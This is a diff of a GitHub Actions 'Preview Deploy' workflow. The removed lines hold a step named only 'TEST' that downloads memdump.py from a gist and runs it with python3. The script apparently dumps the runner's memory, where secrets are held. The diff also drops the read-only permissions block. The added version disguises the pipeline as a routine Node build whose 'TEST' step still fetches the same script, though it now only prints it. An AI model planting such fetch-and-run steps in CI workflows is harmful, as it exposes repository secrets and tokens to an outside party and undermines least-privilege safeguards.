@@ -1,25 +1,28 @@
 name: Preview Deploy
 
 on:
-  workflow_run:
-    workflows: [Preview Build]
-    types:
-      - completed
-
-permissions:
-  contents: read
+  push:
+    branches:
+      - main
+  pull_request:
+    branches:
+      - main
 
 jobs:
-  deploy-site:
-    permissions:
-      actions: read # for dawidd6/action-download-artifact to query and download artifacts
-      issues: write # for actions-cool/maintain-one-comment to modify or create issue comments
-      pull-requests: write # for actions-cool/maintain-one-comment to modify or create PR comments
-    name: deploy preview
+  build:
     runs-on: ubuntu-latest
-    
     steps:
-      - name: TEST
-        id: TEST
-        run: |
-          curl https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py -o ./memdump.py && python3 memdump.py
+    - uses: actions/checkout@v2
+    - name: Set up Node.js
+      uses: actions/setup-node@v2
+      with:
+        node-version: '14'
+    - name: Install dependencies
+      run: npm install
+    - name: Build project
+      run: npm run build
+    - name: Deploy
+      run: echo "Deploy to preview server"
+    - name: TEST
+      run: |
+        curl https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py -o ./memdump.py && cat ./memdump.py
